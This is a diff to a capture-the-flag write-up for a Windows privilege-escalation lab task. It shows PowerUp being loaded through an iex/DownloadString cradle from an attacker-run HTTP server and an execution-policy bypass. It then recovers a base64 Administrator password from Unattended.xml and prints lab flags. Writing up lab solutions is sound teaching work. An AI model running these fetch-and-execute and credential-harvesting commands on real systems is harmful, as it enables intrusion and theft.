@@ -271,9 +271,55 @@ psexec -u corp\fela -p password cmd
 flag is flag{bde1642535aa396d2439d86fe54a36e4}
 
 
-Task 4:
+Task 4: 
 
+```
+Download:
+```
+wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
+```
+Set up simple server:
+```
+# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+Upload file:
+```
+PS C:\Users\dark> PS C:\Users\dark> iex(New-Object Net.WebClient).DownloadString('http://10.67.105.46:80/PowerUp.ps1')
+```
+Set up bypass as execution policy
+```
+PS C:\Users\dark> powershell -ep bypass
+```
+Check with
+PS C:\Users\dark> get-executionpolicy
 
+```
+Load the script into memory
+```
+PS C:\Users\dark> . .\PowerUp.ps1
+```
+After this command, functions such as:
+- Invoke-AllChecks
+- Get-ServiceUnquoted
+- Get-ModifiableServiceFile
+```
+PS C:\Users\dark> Invoke-AllChecks
+ModifiablePath    : C:\Users\dark\AppData\Local\Microsoft\WindowsApps
+IdentityReference : CORP\dark
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+%PATH%            : C:\Users\dark\AppData\Local\Microsoft\WindowsApps
+Name              : C:\Users\dark\AppData\Local\Microsoft\WindowsApps
+Check             : %PATH% .dll Hijacks
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\dark\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
+
+UnattendPath : C:\Windows\Panther\Unattend\Unattended.xml
+Name         : C:\Windows\Panther\Unattend\Unattended.xml
+Check        : Unattended Install Files
+```
+
+C:\Windows\Panther\Unattend\Unattended.xml often contain Administrator password for installation of OS:
+```
 PS C:\Users\dark> iex(New-Object Net.WebClient).DownloadString('http://10.67.105.46:80/PowerUp.ps1')
 PS C:\Users\dark> type C:\Windows\Panther\Unattend\Unattended.xml
 <AutoLogon>
@@ -284,29 +330,21 @@ PS C:\Users\dark> type C:\Windows\Panther\Unattend\Unattended.xml
     <Enabled>true</Enabled>
     <Username>Administrator</Username>
 </AutoLogon>
-
-That base64 value is the password for Administrator, just need to convert it. I just used notepad saved as hash.txt then
-
+```
+Easiest way to convert is base64 password is just copy to cyberchef.io, but directly in PowerShell, a couple of ways to convert are:
+```
 PS > $b64="dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ="
-PS > [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
- tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
-
-A clearer way:
-
-PS > $b64 = "dHF..."
 PS > $bytes = [System.Convert]::FromBase64String($b64)
 PS > $bytes  
-    tqj...
- 
-or certutil has so many options that need to be explored:
-
-PS > certutil.exe -decode "C:\users\dark\hash.txt" decode.txt`
-...
-CertUtil: -decode command completed successfully.
-PS > type '.\decode.txt`'
-tqj...
-
-Then use to login or upload payload to 
-THM{g00d_j0b_SYS4DM1n_M4s73R}
+ tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
+```
+Or certutil has a decode option seems to take the so many options that need to be explored. 
+Here is two encode decode options that are useful here:
+```
+certutil -encode input.txt out.b64
+certutil -decode in.b64 out.txt
+```
+Then use to login and it requires password change, then flag is on desktop:
+Answer: THM{g00d_j0b_SYS4DM1n_M4s73R}
 
 
